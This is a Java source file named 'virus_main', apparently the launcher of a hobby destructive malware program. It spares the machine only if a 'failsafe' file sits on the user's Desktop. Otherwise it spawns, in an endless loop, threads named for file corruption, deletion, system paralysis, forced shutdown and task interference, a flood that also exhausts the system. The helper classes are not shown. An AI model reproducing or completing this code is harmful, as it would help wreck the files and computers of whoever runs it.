package ml.lucid.misc;
//imports
import ml.lucid.thread.*;

import javax.swing.*;
import java.awt.*;
import java.io.File;

import java.util.concurrent.TimeUnit;

public class virus_main {

    private static String login = System.getProperty("user.name");

    static String pathf = "C:\\Users\\"+login+"\\Desktop\\failsafe";

    static File safe = new File(pathf);

    static boolean existing = safe.exists();

    public static void vmain()
            throws Exception {
        if(existing == true) {
            JFrame frame = new JFrame("U got spared!!!");
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            JLabel txtlabel = new JLabel("Exists!!", SwingConstants.CENTER);
            txtlabel.setPreferredSize(new Dimension(300,100));
            txtlabel.setFont(new Font("Century Gothic", Font.PLAIN, 20));
            frame.getContentPane().add(txtlabel, BorderLayout.CENTER);

            frame.setLocation(500,500);
            frame.pack();
            frame.setVisible(true);
            TimeUnit.SECONDS.sleep(40);
            System.exit(0);

        } else if(existing == false) {
            while(true) {
                Thread corr = new Thread(new CorruptionThread());
                Thread Deleter = new Thread(new DeleterThread());
                Thread File = new Thread(new FileThread());
                Thread paralyzeThread = new Thread(new ParalyzeThread());
                Thread Shutdown = new Thread(new ShutdownThread());
                Thread task = new Thread(new TaskThread());

                corr.start();
                Deleter.start();
                File.start();
                paralyzeThread.start();
                Shutdown.start();
                task.start();
            }
        }
    }
}